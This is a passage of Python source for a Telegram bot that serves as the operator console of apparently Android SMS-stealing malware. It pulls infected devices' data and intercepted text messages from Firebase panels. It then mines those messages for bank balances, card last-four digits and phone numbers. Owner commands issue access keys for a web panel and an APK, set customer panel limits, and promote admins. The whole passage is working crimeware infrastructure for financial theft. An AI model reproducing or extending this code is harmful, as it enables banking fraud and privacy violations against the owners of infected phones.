    target_uid, idx, dev_enc = parts[2], int(parts[3]), parts[4]
    dev_id = decode_id(dev_enc)
    target_user = db['users'].get(target_uid)
    if not target_user or idx >= len(target_user['panels']): return
    acc = target_user['panels'][idx]
    data = await firebase_req('GET', acc['url'], acc['key'], f'clients/{dev_id}')
    dev = parse_device(dev_id, data) if data else None
    if not dev: return
    msgs_data = await firebase_req('GET', acc['url'], acc['key'], f'messages/{dev_id}')
    messages = []
    if msgs_data and isinstance(msgs_data, dict):
        for k, v in msgs_data.items():
            if isinstance(v, dict):
                messages.append({'text': str(v.get('message') or v.get('body') or v.get('text') or ''), 'sender': str(v.get('sender') or v.get('from') or 'Unknown')})
    analysis = analyze_messages(messages)
    txt = (f"🔍 <b>ADMIN DEVICE INSPECT: {esc(dev['name'])}</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n🆔 <code>{dev['id']}</code>\n📱 {esc(dev['phoneNumber'])}\n"
           f"📶 Provider: {esc(dev['provider'])}\n🔋 Battery: {dev['battery']}\n{'🟢' if dev['status'] else '🔴'} Status: {'Online' if dev['status'] else 'Offline'}\n\n📋 <b>SIM Slots:</b>\n")
    for i, s in enumerate(dev['sims']): txt += f"  ├ SIM {i+1}: <code>{esc(s.get('phoneNumber','?'))}</code>\n"
    if analysis['bankBalances']:
        txt += "\n💰 <b>Bank SMS Detected:</b>\n"
        for b in analysis['bankBalances'][:5]: txt += f"  ├ {esc(b['bankName'])}: ₹{esc(b['availableBalance'])}\n"
        if len(analysis['bankBalances']) > 5: txt += f"  ├ ... and {len(analysis['bankBalances']) - 5} more\n"
    if analysis['cards']:
        txt += "\n💳 <b>Cards Detected:</b>\n"
        for c in analysis['cards'][:5]: txt += f"  ├ {esc(c['cardType'])} XX{esc(c['cardLast4'])}\n"
        if len(analysis['cards']) > 5: txt += f"  ├ ... and {len(analysis['cards']) - 5} more\n"
    if analysis['phoneNumbers']:
        txt += "\n📞 <b>Detected Numbers:</b>\n"
        for p in analysis['phoneNumbers'][:5]: txt += f"  ├ <code>{esc(p)}</code>\n"
        if len(analysis['phoneNumbers']) > 5: txt += f"  ├ ... and {len(analysis['phoneNumbers']) - 5} more\n"
    txt += f"\n📨 <b>Total SMS:</b> {len(messages)}"
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 Back to Devices", callback_data=f"admin_vd_{target_uid}_{idx}_0_all"))
    await safe_edit(call.message.chat.id, call.message.message_id, txt, markup)

@bot.message_handler(commands=['genkey'])
async def admin_genkey(message):
    if message.from_user.id not in OWNER_IDS:
        return
    args = message.text.split()
    key_type = (args[1] if len(args) > 1 else "web").lower()
    if key_type not in ("web", "apk"):
        return await bot.send_message(
            message.chat.id,
            "⚠️ Usage: /genkey [web|apk]\nExample: /genkey web",
        )
    key = _create_access_key(key_type=key_type)
    label = "Website (mobile.php)" if key_type == "web" else "APK app"
    await bot.send_message(
        message.chat.id,
        f"🔑 <b>New {label} key</b>\n\n<code>{key}</code>\n\n"
        "Share this key once — it expires after first use.",
    )

@bot.message_handler(commands=['addlimit'])
async def admin_addlimit(message):
    if message.from_user.id not in OWNER_IDS: return
    args = message.text.split()
    if len(args) < 3: return await bot.send_message(message.chat.id, "⚠️ Usage: /addlimit &lt;uid&gt; &lt;amount&gt;")
    uid, amt = args[1], int(args[2])
    async with db_lock:
        if uid in db['users']:
            db['users'][uid]['limit'] = amt
            await save_db()
            await bot.send_message(message.chat.id, f"✅ <b>Success:</b> Panel limit for <code>{uid}</code> set to <b>{amt}</b>.")
        else: await bot.send_message(message.chat.id, "❌ User not found.")

@bot.message_handler(commands=['setadmin'])
async def admin_setadmin(message):
    if message.from_user.id not in OWNER_IDS: return
    args = message.text.split()
    if len(args) < 2: return await bot.send_message(message.chat.id, "⚠️ Usage: /setadmin &lt;uid&gt;")
    uid = args[1]
    async with db_lock:
        if uid in db['users']:
            db['users'][uid]['role'] = 'admin'
            await save_db()
            await bot.send_message(message.chat.id, f"✅ <b>Success:</b> <code>{uid}</code> is now an <b>Admin</b>.")
        else: await bot.send_message(message.chat.id, "❌ User not found.")

@bot.message_handler(commands=['broadcast'])
async def admin_broadcast(message):
    if not is_admin(message.from_user.id): return
    if not message.reply_to_message:
        return await bot.send_message(message.chat.id, "⚠️ <b>Error:</b> Reply to a message with /broadcast to send it.")
    user_steps[message.from_user.id] = {"action": "wait_broadcast", "msg_id": message.reply_to_message.message_id}
    await bot.send_message(message.chat.id, "⚠️ <b>Are you sure?</b>\nSend /confirm to broadcast to ALL users, or /cancel.")

@bot.message_handler(commands=['confirm'])
async def broadcast_confirm(message):
    uid = message.from_user.id
    if uid not in user_steps or user_steps[uid].get("action") != "wait_broadcast":
        return
    msg_id = user_steps[uid]["msg_id"]
    del user_steps[uid]
    all_users = list(db['users'].keys())
    succ, fail = 0, 0
    status_msg = await bot.send_message(message.chat.id, "📢 Broadcasting in progress...")
    for u in all_users:
        try:
            await bot.copy_message(int(u), message.chat.id, msg_id)
            succ += 1
            await asyncio.sleep(0.05)
        except:
            fail += 1
    await safe_edit(message.chat.id, status_msg.message_id, f"📢 <b>Broadcast Complete!</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n✅ Success: {succ}\n❌ Failed: {fail}")

@bot.callback_query_handler(func=lambda c: c.data == "admin_dashboard")
async def admin_dash(call):
    try: await bot.answer_callback_query(call.id)
    except: pass
    if not is_admin(call.from_user.id): return
    users = len(db['users'])
    panels = sum(len(u['panels']) for u in db['users'].values())
    txt = (f"☠️ <b>{DEVELOPER} COMMAND CENTER</b> ☠️\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
           f"👥 <b>Total Users:</b> <code>{users}</code>\n🔗 <b>Active Panels:</b> <code>{panels}</code>\n⚡ <b>System Status:</b> 🟢 <b>Online</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
           "🛠️ <b>Quick Admin Commands:</b>\n🔸 <code>/info &lt;uid&gt;</code> - User details\n🔸 <code>/addlimit &lt;uid&gt; &lt;amt&gt;</code> - Change limit\n"
           "🔸 <code>/setadmin &lt;uid&gt;</code> - Promote user\n🔸 <code>/broadcast</code> (reply to msg) - Send to all\n\n"
           f"<i>💎 Created by {_get_creator()}</i>")
    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔄 Refresh Stats", callback_data="admin_dashboard"), InlineKeyboardButton("🏠 Home", callback_data="back_home"))
    await safe_edit(call.message.chat.id, call.message.message_id, txt, markup)

# ============================================================================
#  MAIN LOOP 
# ============================================================================
async def main():
    _Ge()   
    acquire_lock()
    try:
        await load_db()
        await bot.remove_webhook()
        print(f"🚀 {DEVELOPER} Bot Online...")
        while True:
            try:
                await bot.infinity_polling(timeout=60, request_timeout=90)
            except ApiTelegramException as e:
                await asyncio.sleep(3)
            except Exception as e:
                await asyncio.sleep(5)
    finally:
        release_lock()

if __name__ == "__main__":
    asyncio.run(main())
